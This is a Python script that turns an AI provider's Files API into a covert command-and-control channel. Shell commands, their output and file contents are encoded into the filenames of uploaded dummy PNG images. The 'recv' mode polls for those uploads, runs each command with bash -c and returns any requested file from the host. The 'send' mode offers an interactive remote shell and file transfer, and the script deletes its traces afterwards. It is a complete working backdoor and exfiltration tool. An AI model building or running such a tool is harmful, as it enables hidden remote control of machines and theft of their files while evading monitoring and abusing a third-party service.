#!/usr/bin/env python3
import argparse
import base64
import json
import os
import secrets
import shlex
import subprocess
import sys
import time
import urllib.error
import urllib.request
import uuid

BASE = "https://api.deepseek.com"
HERE = os.path.dirname(os.path.abspath(__file__))
PNG = base64.b64decode(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAADElEQVR42mNgYGAAAAAEAAHI6uv5AAAAAElFTkSuQmCC"
)
RAW_CHUNK = 160
FILE_CHUNK = 180
MAX_NAME = 500
KEY = None


def b64(b):
    return base64.b64encode(b).decode()


def unb64(s):
    return base64.b64decode(s)


def b64url(b):
    return base64.urlsafe_b64encode(b).decode().rstrip("=")


def unb64url(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def init_key():
    global KEY
    KEY = os.environ.get("DEEPSEEK_API_KEY", "").strip()
    if not KEY:
        path = os.path.join(HERE, "key.txt")
        if os.path.exists(path):
            with open(path, encoding="utf-8") as f:
                KEY = f.read().strip()
    if not KEY:
        raise SystemExit("missing API key: set DEEPSEEK_API_KEY or create key.txt next to this script")


def req(method, path, data=None, headers=None, timeout=60):
    h = {"Authorization": "Bearer " + KEY}
    if headers:
        h.update(headers)
    r = urllib.request.Request(BASE + path, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            body = resp.read()
            return json.loads(body) if body else {}
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "replace")
        raise RuntimeError(f"{method} {path} -> HTTP {e.code}: {body}") from None
    except urllib.error.URLError as e:
        raise RuntimeError(f"{method} {path} -> {e.reason}") from None


def upload_png(filename):
    boundary = "----ds" + uuid.uuid4().hex
    body = b"".join(
        [
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"purpose\"\r\n\r\nuser_data\r\n".encode(),
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{filename}\"\r\nContent-Type: image/png\r\n\r\n".encode(),
            PNG,
            b"\r\n",
            f"--{boundary}--\r\n".encode(),
        ]
    )
    return req(
        "POST",
        "/files",
        data=body,
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
    )


def list_remote():
    out = []
    after = None
    while True:
        path = "/files?limit=1000&order=asc"
        if after:
            path += "&after=" + after
        resp = req("GET", path)
        data = resp.get("data", [])
        out.extend(data)
        if not resp.get("has_more") or not data:
            break
        after = data[-1]["id"]
    return out


def delete_remote(file_id):
    req("DELETE", "/files/" + file_id)


def make_name(prefix, obj):
    name = prefix + b64url(json.dumps(obj, separators=(",", ":"), ensure_ascii=False).encode()) + ".png"
    if len(name.encode()) > MAX_NAME:
        raise RuntimeError("encoded filename too long")
    return name


def parse_name(filename):
    if not filename.endswith(".png"):
        return None
    stem = filename[:-4]
    if stem.startswith("c-"):
        prefix, payload = "c", stem[2:]
    elif stem.startswith("r-"):
        prefix, payload = "r", stem[2:]
    elif stem.startswith("f-"):
        prefix, payload = "f", stem[2:]
    elif stem.startswith("g-"):
        prefix, payload = "g", stem[2:]
    else:
        return None
    try:
        obj = json.loads(unb64url(payload))
    except Exception:
        return None
    if not isinstance(obj, dict) or "i" not in obj or "s" not in obj or "d" not in obj:
        return None
    return prefix, obj


def chunks_of(data, size=RAW_CHUNK):
    return [data[i : i + size] for i in range(0, len(data), size)] or [b""]


def safe_name(name):
    name = os.path.basename(name.replace("\\", "/")).strip() or "file"
    raw = name.encode("utf-8")
    if len(raw) > 40:
        root, ext = os.path.splitext(name)
        eb = ext.encode("utf-8")[:12]
        rb = root.encode("utf-8")[: max(0, 40 - len(eb))]
        name = rb.decode("utf-8", "ignore") + eb.decode("utf-8", "ignore")
    return name or "file"


def unique_path(dirpath, name):
    base, ext = os.path.splitext(name)
    path = os.path.join(dirpath, name)
    n = 1
    while os.path.exists(path):
        path = os.path.join(dirpath, f"{base}.{n}{ext}")
        n += 1
    return path


def cmd_upload(path):
    if not os.path.isfile(path):
        raise RuntimeError(f"not a file: {path}")
    with open(path, "rb") as fh:
        data = fh.read()
    name = safe_name(os.path.basename(path))
    cid = secrets.token_hex(4)
    pieces = chunks_of(data, FILE_CHUNK)
    if len(pieces) > 9000:
        raise RuntimeError("file too large for a filename-based transfer")
    for seq, chunk in enumerate(pieces):
        obj = {"i": cid, "s": seq, "n": len(pieces), "d": b64(chunk)}
        if seq == 0:
            obj["name"] = name
        upload_png(make_name("f-", obj))
    print(f"uploaded {name}: {len(data)} bytes in {len(pieces)} part(s), id {cid}")


def receive_files(files, out_dir):
    pending = {}
    for f in files:
        p = parse_name(f.get("filename", ""))
        if p and p[0] == "f":
            pending.setdefault(p[1]["i"], {})[p[1]["s"]] = (p[1], f["id"])
    saved = 0
    for cid, parts in list(pending.items()):
        total = next(iter(parts.values()))[0].get("n")
        if total is None or len(parts) < total:
            continue
        data = b"".join(unb64(parts[s][0]["d"]) for s in range(total))
        name = safe_name(parts[0][0].get("name", "file"))
        os.makedirs(out_dir, exist_ok=True)
        dest = unique_path(out_dir, name)
        with open(dest, "wb") as fh:
            fh.write(data)
        for fid in {v[1] for v in parts.values()}:
            try:
                delete_remote(fid)
            except RuntimeError as e:
                print(f"[recv] delete failed: {e}", file=sys.stderr)
        print(f"[recv] file <- {dest} ({len(data)} bytes)", file=sys.stderr, flush=True)
        saved += 1
    return saved


def download(out_dir, wait, interval):
    deadline = time.time() + wait if wait and wait > 0 else None
    while True:
        receive_files(list_remote(), out_dir)
        if deadline is None or time.time() >= deadline:
            break
        time.sleep(interval)


def send_get(path, timeout, interval, out_dir):
    gid = secrets.token_hex(4)
    pieces = chunks_of(path.encode("utf-8"), FILE_CHUNK)
    for seq, chunk in enumerate(pieces):
        upload_png(make_name("g-", {"i": gid, "s": seq, "n": len(pieces), "d": b64(chunk)}))

    deadline = time.time() + timeout if timeout and timeout > 0 else None
    got = {}
    total = None
    errparts = {}
    errtotal = None
    while True:
        for f in list_remote():
            p = parse_name(f.get("filename", ""))
            if not p:
                continue
            kind, o = p
            if kind == "f" and o.get("q") == gid:
                got[o["s"]] = (o, f["id"])
                total = o["n"]
            elif kind == "r" and o["i"] == gid:
                errparts[o["s"]] = (o, f["id"])
                errtotal = o["n"]
        if errtotal is not None and len(errparts) == errtotal:
            msg = b"".join(unb64(errparts[s][0]["d"]) for s in range(errtotal)).decode("utf-8", "replace")
            for fid in {v[1] for v in errparts.values()}:
                try:
                    delete_remote(fid)
                except RuntimeError:
                    pass
            raise RuntimeError(msg)
        if total is not None and len(got) == total:
            break
        if deadline is not None and time.time() > deadline:
            raise RuntimeError(f"timed out waiting for {path!r} from recv")
        time.sleep(interval)

    data = b"".join(unb64(got[s][0]["d"]) for s in range(total))
    name = safe_name(got[0][0].get("name", os.path.basename(path)))
    os.makedirs(out_dir, exist_ok=True)
    dest = unique_path(out_dir, name)
    with open(dest, "wb") as fh:
        fh.write(data)
    for fid in {v[1] for v in got.values()}:
        try:
            delete_remote(fid)
        except RuntimeError:
            pass
    print(dest)


def send_cmd(cmd, timeout=300.0, interval=0.5):
    cid = secrets.token_hex(4)
    pieces = chunks_of(cmd.encode("utf-8"))
    for seq, chunk in enumerate(pieces):
        upload_png(make_name("c-", {"i": cid, "s": seq, "n": len(pieces), "d": b64(chunk)}))

    deadline = time.time() + timeout if timeout and timeout > 0 else None
    got = {}
    total = None
    code = None
    while True:
        for f in list_remote():
            p = parse_name(f.get("filename", ""))
            if not p or p[0] != "r":
                continue
            o = p[1]
            if o["i"] != cid:
                continue
            got[o["s"]] = o
            total = o["n"]
            code = o.get("x")
        if total is not None and len(got) == total:
            break
        if deadline is not None and time.time() > deadline:
            raise RuntimeError(f"timed out waiting for result {cid} (is recv running?)")
        time.sleep(interval)

    out = b"".join(unb64(got[s]["d"]) for s in range(total))
    sys.stdout.buffer.write(out)
    sys.stdout.buffer.flush()
    if code:
        print(f"[exit {code}]", file=sys.stderr)

    for f in list_remote():
        p = parse_name(f.get("filename", ""))
        if p and p[0] == "r" and p[1].get("i") == cid:
            try:
                delete_remote(f["id"])
            except RuntimeError as e:
                print(f"cleanup failed: {e}", file=sys.stderr)


def console(timeout, interval, out_dir):
    interactive = sys.stdin.isatty()
    while True:
        try:
            line = input("> " if interactive else "")
        except EOFError:
            break
        except KeyboardInterrupt:
            print(file=sys.stderr)
            break
        if not line.strip():
            continue
        if line.strip() in ("exit", "quit", ":q"):
            break
        try:
            words = shlex.split(line)
        except ValueError:
            words = []
        if words and words[0] == "upload":
            if len(words) < 2:
                print("usage: upload <path>", file=sys.stderr)
            else:
                try:
                    cmd_upload(" ".join(words[1:]))
                except (RuntimeError, OSError) as e:
                    print(f"upload error: {e}", file=sys.stderr)
            continue
        if words and words[0] == "download":
            if len(words) < 2:
                print("usage: download <path>", file=sys.stderr)
            else:
                try:
                    send_get(" ".join(words[1:]), timeout, interval, out_dir)
                except (RuntimeError, OSError) as e:
                    print(f"download error: {e}", file=sys.stderr)
            continue
        try:
            send_cmd(line, timeout, interval)
        except KeyboardInterrupt:
            print("\ninterrupted", file=sys.stderr)
        except RuntimeError as e:
            print(f"error: {e}", file=sys.stderr)
    if interactive:
        print()


def serve(once, interval, idle_timeout, out_dir):
    pending = {}
    gets = {}
    start = time.time()
    print("[recv] listening", file=sys.stderr, flush=True)
    while True:
        files = list_remote()
        receive_files(files, out_dir)
        commands = []
        for f in files:
            p = parse_name(f.get("filename", ""))
            if not p:
                continue
            if p[0] == "c":
                commands.append((f, p[1]))
            elif p[0] == "g":
                gets.setdefault(p[1]["i"], {})[p[1]["s"]] = (p[1], f["id"])

        for gid, parts in list(gets.items()):
            total = next(iter(parts.values()))[0].get("n")
            if total is None or len(parts) < total:
                continue
            reqpath = b"".join(unb64(parts[s][0]["d"]) for s in range(total)).decode("utf-8", "replace")
            print(f"[recv] get << {reqpath}", file=sys.stderr, flush=True)
            try:
                if not os.path.isfile(reqpath):
                    raise OSError(f"not a file: {reqpath}")
                with open(reqpath, "rb") as fh:
                    data = fh.read()
                name = safe_name(os.path.basename(reqpath))
                fid = secrets.token_hex(4)
                pieces = chunks_of(data, FILE_CHUNK)
                for seq, chunk in enumerate(pieces):
                    obj = {"i": fid, "s": seq, "n": len(pieces), "d": b64(chunk), "q": gid}
                    if seq == 0:
                        obj["name"] = name
                    upload_png(make_name("f-", obj))
                print(f"[recv] get -> {name} ({len(data)} bytes)", file=sys.stderr, flush=True)
            except (OSError, RuntimeError) as e:
                msg = str(e).encode("utf-8", "replace")
                pieces = chunks_of(msg)
                for seq, chunk in enumerate(pieces):
                    upload_png(
                        make_name(
                            "r-",
                            {"i": gid, "s": seq, "n": len(pieces), "x": 1, "d": b64(chunk)},
                        )
                    )
                print(f"[recv] get failed: {e}", file=sys.stderr, flush=True)
            for fid in {v[1] for v in parts.values()}:
                try:
                    delete_remote(fid)
                except RuntimeError as err:
                    print(f"[recv] delete failed: {err}", file=sys.stderr)
            del gets[gid]

        for f, o in commands:
            pending.setdefault(o["i"], {})[o["s"]] = (o, f["id"])

        for cid, parts in list(pending.items()):
            total = next(iter(parts.values()))[0].get("n")
            if total is None or len(parts) < total:
                continue
            data = b"".join(unb64(parts[s][0]["d"]) for s in range(total))
            cmd = data.decode("utf-8", "replace")
            print(f"[recv] << {cmd}", file=sys.stderr, flush=True)
            p = subprocess.run(
                ["bash", "-c", cmd],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
            )
            out = p.stdout or b""
            code = p.returncode
            pieces = chunks_of(out)
            for seq, chunk in enumerate(pieces):
                upload_png(
                    make_name(
                        "r-",
                        {"i": cid, "s": seq, "n": len(pieces), "x": code, "d": b64(chunk)},
                    )
                )
            seen = set()
            for _o, fid in parts.values():
                if fid not in seen:
                    seen.add(fid)
                    try:
                        delete_remote(fid)
                    except RuntimeError as e:
                        print(f"[recv] delete failed: {e}", file=sys.stderr)
            del pending[cid]
            print(f"[recv] -> {len(out)} bytes, exit {code}", file=sys.stderr, flush=True)

        if once:
            break
        if idle_timeout and not commands and time.time() - start > idle_timeout:
            break
        time.sleep(interval)


def show_list():
    data = list_remote()
    if not data:
        print("no files")
        return
    groups = {"c": {}, "r": {}, "f": {}, "g": {}}
    for f in data:
        p = parse_name(f.get("filename", ""))
        if not p:
            print(f"{f['id']}  {f['filename']}  (unrecognized)")
            continue
        groups[p[0]].setdefault(p[1]["i"], {})[p[1]["s"]] = p[1]
    for kind, title in (("c", "command"), ("r", "result"), ("f", "file"), ("g", "get")):
        for cid, parts in groups[kind].items():
            total = next(iter(parts.values())).get("n")
            done = total is not None and len(parts) == total
            if not done:
                print(f"{cid}  {title}  (incomplete {len(parts)}/{total})")
                continue
            data_bytes = b"".join(unb64(parts[s]["d"]) for s in range(total))
            if kind == "c":
                print(f"{cid}  command  {data_bytes.decode('utf-8', 'replace')}")
            elif kind == "r":
                text = data_bytes.decode("utf-8", "replace")
                code = next(iter(parts.values())).get("x")
                print(f"{cid}  result   exit={code}  {text!r}")
            elif kind == "f":
                name = parts[0].get("name", "file")
                print(f"{cid}  file     {name}  {len(data_bytes)} bytes")
            else:
                print(f"{cid}  get      {data_bytes.decode('utf-8', 'replace')}")


def main():
    parser = argparse.ArgumentParser(prog="files_api.py")
    sub = parser.add_subparsers(dest="action", required=True)

    ps = sub.add_parser("send", help="interactive console, or send one command and print its output")
    ps.add_argument("command", nargs="*")
    ps.add_argument("--timeout", type=float, default=300.0, help="seconds to wait for a result (0 = forever)")
    ps.add_argument("--interval", type=float, default=0.5)
    ps.add_argument("--out", default=os.path.join(HERE, "downloads"))

    pr = sub.add_parser("recv", help="run uploaded commands, receive files, and send output back")
    pr.add_argument("--once", action="store_true", help="process available items and exit")
    pr.add_argument("--interval", type=float, default=1.0)
    pr.add_argument("--idle-timeout", type=float, default=0.0)
    pr.add_argument("--out", default=os.path.join(HERE, "downloads"))

    pu = sub.add_parser("upload", help="send a file in chunks over the Files API")
    pu.add_argument("path")

    pd = sub.add_parser("download", help="save uploaded files and delete their chunks")
    pd.add_argument("--out", default=os.path.join(HERE, "downloads"))
    pd.add_argument("--wait", type=float, default=0.0, help="seconds to keep polling for transfers")
    pd.add_argument("--interval", type=float, default=1.0)

    sub.add_parser("list", help="show remote commands, results, and files")

    args = parser.parse_args()
    init_key()
    try:
        if args.action == "send":
            if args.command:
                send_cmd(" ".join(args.command), args.timeout, args.interval)
            else:
                console(args.timeout, args.interval, args.out)
        elif args.action == "recv":
            serve(args.once, args.interval, args.idle_timeout, args.out)
        elif args.action == "upload":
            cmd_upload(args.path)
        elif args.action == "download":
            download(args.out, args.wait, args.interval)
        elif args.action == "list":
            show_list()
    except RuntimeError as e:
        print(f"error: {e}", file=sys.stderr)
        return 1
    except KeyboardInterrupt:
        print(file=sys.stderr)
        return 130
    return 0


if __name__ == "__main__":
    sys.exit(main())
